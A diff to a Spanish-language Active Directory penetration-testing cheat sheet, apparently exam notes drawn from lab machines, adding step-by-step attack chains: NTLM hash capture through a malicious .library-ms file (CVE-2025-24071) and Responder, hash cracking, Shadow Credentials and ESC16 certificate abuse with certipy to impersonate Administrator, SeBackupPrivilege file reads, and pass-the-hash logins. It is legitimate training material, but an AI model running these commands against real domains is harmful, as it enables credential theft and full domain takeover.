@@ -400,6 +400,158 @@ evil-winrm -i <IP> -u 'Administrator' -p '<password_de_laps>' -S
 
 ---
 
+## FASE 2b — Captura de hash vía archivo malicioso en un share (CVE-2025-24071, estilo library-ms)
+
+Caso real (máquina Fluffy). Si encuentras un share SMB donde tienes permiso de **escritura**, y el PDF/notas de la máquina mencionan una CVE de "File Explorer Spoofing" o similar relacionada con `.library-ms`, el ataque es: subir un archivo especialmente armado que, cuando alguien (un proceso automatizado del dominio) lo indexa/abre, dispara una autenticación SMB hacia TU máquina — capturas su hash NTLMv2 sin que nadie haga click en nada de forma consciente.
+
+```bash
+# 1. Confirma que tienes escritura en el share (no solo lectura)
+smbclient //<IP>/<share> -U '<user>'
+smb: \> put archivo_prueba.txt    # si funciona, tienes escritura
+
+# 2. Prepara el archivo malicioso (ej: con el PoC de la CVE específica)
+# Busca el PoC exacto de la CVE que te señale el enunciado — suele ser un script
+# que empaqueta un .library-ms dentro de un .zip con una ruta UNC apuntando a ti.
+```
+
+```bash
+# 3. Levanta un listener para capturar la autenticación entrante
+sudo responder -I tun0
+# NOTA: en este caso Responder se usa como LISTENER pasivo para capturar la
+# autenticación que el propio exploit provoca — no es poisoning de LLMNR/NBT-NS
+# broadcast. Aun así, verifica la política exacta antes de usar esto en el
+# examen real; el principio seguro es "solo modo análisis" salvo que el vector
+# sea explícitamente parte de la cadena de un CVE específico documentado.
+```
+
+```bash
+# 4. Sube el archivo malicioso al share con escritura
+smbclient //<IP>/<share> -U '<user>' -c "put malicious.zip"
+```
+
+**Resultado esperado:** Responder captura un hash NetNTLMv2 de algún usuario del dominio. Crackéalo:
+```bash
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
+
+---
+
+## FASE 5f — Shadow Credentials (abuso de GenericWrite/GenericAll sobre una cuenta)
+
+Caso real (máquina Fluffy). Si BloodHound muestra que tienes `GenericWrite` o `GenericAll` sobre una cuenta (no un grupo, una cuenta de usuario/servicio específica), una alternativa a resetear su password (que a veces rompe cosas o es detectado) es el ataque de **Shadow Credentials**: agregas tu propia "credencial de certificado" al atributo `msDS-KeyCredentialLink` de esa cuenta, lo que te permite autenticar como ella usando un certificado que TÚ generaste, sin tocar su password en absoluto.
+
+```bash
+# Con certipy (ya lo necesitas para la fase de AD CS, así que es la misma herramienta)
+certipy shadow auto -u '<tu_usuario>@<dominio>' -p '<tu_pass>' -dc-ip <DC_IP> -account '<cuenta_objetivo>'
+```
+Esto te genera un certificado y, con él, recupera el **hash NT** de la cuenta objetivo directamente — sin necesitar crackear nada, sin resetear su password.
+
+**Alternativa con `pywhisker`** (si `certipy shadow` no está disponible o da error):
+```bash
+python3 pywhisker.py -d '<dominio>' -u '<tu_usuario>' -p '<tu_pass>' --target '<cuenta_objetivo>' --action add
+```
+
+> 🔴 **Si certipy da error de reloj/tiempo al autenticar** (`KRB_AP_ERR_SKEW` u otro error de validez de certificado), antepón `faketime` sincronizado con el reloj del DC a CUALQUIER comando de certipy que falle por esto:
+> ```bash
+> faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" certipy shadow auto -u '...' -p '...' -dc-ip <DC_IP> -account '...'
+> ```
+> Esto pasa seguido con certificados porque son mucho más estrictos con la hora que NTLM — un desfase de unos minutos entre tu Kali y el DC puede invalidar el certificado completo, aunque todo lo demás esté bien.
+
+**Con el hash NT obtenido, movimiento lateral normal (Fase 6):**
+```bash
+evil-winrm -i <IP> -u '<cuenta_objetivo>' -H '<NT_HASH>'
+```
+
+### Alternativa cuando `net rpc`/`ldapmodify` fallan para unirte a un grupo — `bloodyAD`
+
+Ya documentamos en Fase 8 que `net rpc group addmem` puede fallar silenciosamente, y la alternativa era LDAP directo (`ldapmodify`). **`bloodyAD`** es otra alternativa, más simple de usar cuando funciona (requiere resolver antes el conflicto de dependencias de `cryptography` — ver nota en Fase 8):
+```bash
+bloodyAD -u '<tu_usuario>' -p '<tu_pass>' -d <dominio> --host <DC_IP> add groupMember '<GRUPO>' '<tu_usuario>'
+```
+
+---
+
+## FASE 8c — Active Directory Certificate Services (AD CS) / ESC16 con Certipy
+
+**Qué es AD CS:** un servicio de Windows que emite certificados digitales dentro del dominio. Mal configurado, un certificado puede usarse para **autenticar como cualquier usuario** (incluido Administrator) sin conocer su password — es un vector de escalada completo, paralelo a DCSync/ACL, y cada vez más común en máquinas/examen recientes.
+
+**ESC16 específicamente:** la CA (Certificate Authority) tiene deshabilitada una "extensión de seguridad" que normalmente ata el certificado emitido al SID de la cuenta que lo pidió. Sin esa extensión, puedes **cambiar el UPN (User Principal Name) de una cuenta que ya controles** (ej: una cuenta de servicio donde conseguiste el hash vía Shadow Credentials) a `administrator`, pedir un certificado para esa cuenta, y el certificado resultante sirve para autenticar como el Administrator real.
+
+```bash
+# 1. Enumera si la CA tiene ESC16 (o cualquier otra vulnerabilidad de plantillas)
+certipy find -u '<cuenta_con_hash>@<dominio>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -vulnerable -enabled -stdout
+# Busca en el output: "ESC16 : Security Extension is disabled."
+```
+
+```bash
+# 2. Cambia el UPN de tu cuenta controlada a "administrator"
+#    (esto es lo que hace que el certificado, al pedirse, quede vinculado a esa identidad)
+certipy account update -u '<cuenta_con_hash>@<dominio>' -hashes ':<NT_HASH>' -user '<cuenta_con_hash>' -upn 'administrator' -dc-ip <DC_IP>
+```
+
+```bash
+# 3. Pide el certificado como esa cuenta (ahora con UPN "administrator")
+certipy req -u '<cuenta_con_hash>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -target <HOSTNAME_FQDN_DC> -ca '<NOMBRE_CA>' -template 'User'
+# Te genera administrator.pfx
+```
+
+```bash
+# 4. Autentica con ese certificado para obtener el hash NT real de Administrator
+#    (de nuevo, si hay desfase de reloj, antepón faketime)
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <dominio>
+```
+
+```bash
+# 5. IMPORTANTE — restaura el UPN de la cuenta que modificaste a su valor original
+#    cuando termines, es buena práctica (y a veces necesario para no romper otra cosa)
+certipy account update -u '<cuenta_con_hash>' -hashes ':<NT_HASH>' -user '<cuenta_con_hash>' -upn '<cuenta_con_hash>@<dominio>' -dc-ip <DC_IP>
+```
+
+**Con el hash NT de Administrator obtenido en el paso 4 — Pass-the-Hash normal (Fase 9).**
+
+> 🔴 **Usa SIEMPRE la versión más reciente de `certipy`.** Varios writeups de esta misma máquina mencionan explícitamente que versiones viejas de certipy no detectan ESC16 correctamente o fallan en el flujo. Actualiza antes de asumir que la técnica no aplica:
+> ```bash
+> pip install certipy-ad --upgrade --break-system-packages
+> # o, si usas venv (recomendado dado los conflictos de cryptography ya documentados):
+> python3 -m venv ~/venv-certipy && source ~/venv-certipy/bin/activate && pip install certipy-ad
+> ```
+
+> **Cadena completa de la máquina real que motivó esta sección:** share con escritura → CVE-2025-24071 + Responder → hash de un usuario #1 → ACL (`GenericWrite`) sobre cuentas de servicio → Shadow Credentials → hash de cuenta de servicio #2 (`ca_svc`) → `certipy find` revela ESC16 → cambiar UPN → pedir certificado → `certipy auth` (con `faketime` si hace falta) → hash de Administrator.
+
+---
+
+## FASE 5e — Abuso de `SeBackupPrivilege` (leer archivos protegidos sin ser Administrator)
+
+Caso real (máquina Return). Ves en `whoami /priv` que tienes `SeBackupPrivilege Enabled`, y como Administrator es propietario de un archivo (ej: `root.txt` en su Desktop), intentas leerlo con `type`/`Get-Content` y da `Access is denied` — **incluso descargándolo con evil-winrm `download` llega vacío (0 bytes)**.
+
+> 🔴 **Lección clave: tener un privilegio "Enabled" en el token NO significa que se aplique automáticamente a cualquier comando.** `SeBackupPrivilege` solo se activa cuando usas una herramienta que invoca explícitamente la semántica de "backup" de la API de Windows — eso es lo que le dice al sistema "ignora la ACL normal, esto es una operación de respaldo". `type`, `Get-Content`, `cat`, y el `download` normal de evil-winrm NO activan esa semántica — por eso fallan o traen el archivo vacío, aunque el privilegio esté ahí.
+
+**Solución más simple — `robocopy` con el flag `/B` (modo backup):**
+```powershell
+robocopy C:\Users\Administrator\Desktop C:\Users\<tu_usuario>\Documents\loot root.txt /B
+```
+El `/B` le dice a robocopy que use la API de backup de Windows, que SÍ respeta `SeBackupPrivilege` y copia el archivo saltándose la ACL normal del propietario.
+
+**Luego, léelo normal desde tu propia carpeta (ya no tiene la ACL restrictiva del original):**
+```powershell
+type C:\Users\<tu_usuario>\Documents\loot\root.txt
+```
+
+**Alternativa con módulo dedicado** (si `robocopy /B` no coopera, o necesitas volcar algo más sensible tipo SAM/SYSTEM/NTDS):
+```powershell
+# Sube SeBackupPrivilegeCmdLets.dll y SeBackupPrivilegeUtils.dll (recuerda: barras "/" con upload de evil-winrm)
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\ruta\destino\root.txt
+```
+
+**Otros privilegios que aparecen junto a `SeBackupPrivilege` y para qué sirven** (útil reconocerlos en `whoami /priv`, mismo patrón: "Enabled" no basta, necesitas la herramienta correcta):
+- `SeRestorePrivilege` → escribir/sobreescribir archivos saltándose ACL (complemento de Backup, para escalar más allá de solo leer).
+- `SeLoadDriverPrivilege` → cargar drivers en modo kernel (vector de privesc distinto, vía drivers vulnerables).
+- `SeTakeOwnershipPrivilege` → tomar posesión de cualquier objeto, similar en efecto a WriteOwner en AD pero a nivel de sistema de archivos local.
+
+---
+
 ## FASE 6 — Movimiento lateral
 
 ```bash
@@ -432,7 +584,74 @@ impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
 
 ---
 
-## FASE 7 — WinPEAS y post-explotación (encontrar credenciales de autologin, privesc)
+## FASE 7 — Enumeración nativa desde dentro (RDP + PowerShell/.NET, sin nxc/impacket)
+
+Útil cuando: el firewall solo deja pasar RDP/WinRM (no SMB/RPC desde fuera), o ya tienes shell y quieres enumerar sin depender de herramientas externas ni dejar binarios en disco.
+
+```bash
+xfreerdp /u:<user> /d:<dominio> /v:<IP_cliente> +clipboard
+# Si da error de Kerberos "Cannot contact any KDC", agrega el DC a tu /etc/hosts (Fase 0)
+```
+
+```cmd
+:: Usuarios y grupos DEL DOMINIO (no confundir con los locales de abajo)
+net user /domain
+net group "Domain Admins" /domain
+
+:: Usuarios y grupos LOCALES de la máquina donde estás parado (¡distinto!)
+net user
+net localgroup administrators
+```
+> 🔴 **Confusión real:** `net user` (sin `/domain`) solo muestra cuentas LOCALES de esa máquina, no del dominio.
+
+### PowerShell + .NET classes — construir la ruta LDAP dinámicamente
+
+**Por qué esto existe cuando `nxc smb <IP>` ya te dice el dominio:** `nxc` te **informa un dato** para que tú lo leas; este script **construye una variable utilizable dentro de la misma sesión de PowerShell** que puedes encadenar directo en la siguiente consulta, sin copiar/pegar el nombre del dominio a mano cada vez. Es la diferencia entre que te digan el dato y que el script se autoconfigure con él para seguir trabajando. Vale la pena cuando vas a hacer VARIAS consultas LDAP seguidas desde la misma shell, o cuando SMB/RPC no son alcanzables desde tu Kali pero sí tienes shell dentro de la red del dominio.
+
+```powershell
+# 1. Obtener el PDC dinámicamente (sin hardcodear el nombre del dominio)
+$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+
+# 2. Obtener el DN del dominio en formato LDAP (DC=corp,DC=com), vía ADSI con comillas vacías
+#    (comillas vacías = empezar desde la raíz de la jerarquía de AD)
+$DN = ([adsi]'').distinguishedName
+
+# 3. Ensamblar la ruta LDAP completa
+$LDAP = "LDAP://$PDC/$DN"
+$LDAP   # imprime para verificar, ej: LDAP://DC1.corp.com/DC=corp,DC=com
+```
+
+```powershell
+# Con $LDAP ya armado, reutilízalo en cualquier consulta con filtro:
+$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$LDAP)
+$searcher.Filter = "(objectClass=user)"
+$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }
+
+# Cambia solo el .Filter para otras consultas, reutilizando el mismo $searcher/$LDAP:
+$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"   # Kerberoastable
+$searcher.Filter = "(objectClass=computer)"                           # computadoras
+$searcher.Filter = "(objectClass=group)"                              # grupos
+```
+
+> Requiere PowerShell, NO cmd.exe. Si tu prompt dice `C:\Users\...>` sin "PS" adelante, escribe `powershell` primero. Si el script da error de política de ejecución, usa `powershell -ep bypass` antes de correrlo.
+
+### PowerView (alternativa cuando no quieres escribir tus propios filtros LDAP)
+
+Hace gran parte de lo que BloodHound muestra visualmente, pero en PowerShell puro, sin necesitar subir binarios pesados ni tener Neo4j/Postgres corriendo — útil como plan B si BloodHound no es viable por tiempo o por restricciones de red en el examen.
+
+```powershell
+. .\PowerView.ps1    # cárgalo primero (recuerda subirlo con barras "/" si usas evil-winrm upload)
+
+Get-NetUser                          # equivalente a enumerar usuarios
+Get-NetGroup "Domain Admins"         # miembros de un grupo
+Get-NetComputer                      # computadoras del dominio
+Find-LocalAdminAccess                # dónde tienes admin local, sin BloodHound
+Get-ObjectAcl -Identity <usuario>    # permisos ACL sobre un objeto (equivalente a un edge de BloodHound)
+```
+
+---
+
+## FASE 7b — WinPEAS y post-explotación (encontrar credenciales de autologin, privesc)
 
 ```bash
 # En Kali: sirve winPEAS desde la carpeta CORRECTA donde está el binario
@@ -693,9 +912,12 @@ nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
    → winPEAS (servir desde carpeta correcta, IP de VPN, convertir UTF-16→UTF-8 antes de grep)
    → ¿autologin encontrado? CRUZAR contra directorios reales en C:\Users (nombre puede diferir)
    → repetir BloodHound con el nuevo usuario si hace falta
-   → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify + dacledit)
-   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps) o Azure AD Connect
-     (grupo "Azure Admins", cuentas AAD_*, servicio ADSync corriendo)
+   → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify/bloodyAD + dacledit)
+   → ¿GenericWrite/GenericAll sobre una CUENTA (no grupo)? → Shadow Credentials
+     (certipy shadow auto) en vez de resetear password
+   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps), Azure AD Connect
+     (grupo "Azure Admins", cuentas AAD_*, servicio ADSync), o AD CS/ESC16 (certipy find
+     -vulnerable → cambiar UPN → pedir certificado → certipy auth)
    → Pass-the-Hash al DC (o password de LAPS) con el hash/pass del Administrator
    → flags (user.txt / root.txt / proof.txt) — Administrator lee CUALQUIER carpeta,
      no necesitas ser el usuario dueño de la flag
@@ -712,3 +934,6 @@ nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
 7. **¿BloodHound no muestra NINGÚN camino útil a Domain Admin?** → antes de rendirte, revisa shares en busca de archivos `.xml`/`.config`/`.zip`/`.pfx` con credenciales filtradas, y busca indicios de Azure AD Connect (grupo "Azure Admins", cuentas `AAD_*`, servicio `ADSync`) o de LAPS (`nxc ldap -M laps`) — no todo pasa por ACLs o Kerberos.
 8. **¿WinRM da `ConnectTimeoutError` o similar al conectar?** → antes de asumir que es un problema de red, confirma qué puerto está REALMENTE abierto (`nmap -p5985,5986 <IP>`). Si es 5986 en vez de 5985, agrega `-S` (SSL) al comando de evil-winrm.
 9. **¿Tienes shell de Administrator pero la flag "no existe" en la ruta que probaste?** → Administrator puede leer la carpeta de CUALQUIER usuario del sistema, la flag no tiene que estar en `C:\Users\Administrator\` — revisa `dir C:\Users` para ver qué otras cuentas existen y busca ahí.
+10. **¿`whoami /priv` muestra un privilegio interesante (`SeBackupPrivilege`, etc.) pero `type`/`download` da "Access denied" o trae el archivo vacío?** → un privilegio "Enabled" NO se aplica solo; necesitas una herramienta que invoque explícitamente esa semántica (ej: `robocopy /B` para SeBackupPrivilege). No descartes el privilegio solo porque el comando obvio falló.
+11. **¿`certipy` no encuentra la vulnerabilidad que esperabas, o falla de forma rara?** → actualiza a la versión más reciente antes de asumir que la técnica no aplica (`pip install certipy-ad --upgrade --break-system-packages`); versiones viejas no detectan correctamente varias ESC (incluida ESC16).
+12. **¿Un comando de Kerberos/certipy falla por error de tiempo/reloj (`KRB_AP_ERR_SKEW` o similar)?** → antepón `faketime` sincronizado con el reloj del DC al comando completo: `faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" <comando>`. Los certificados son mucho más estrictos con la hora que NTLM normal.
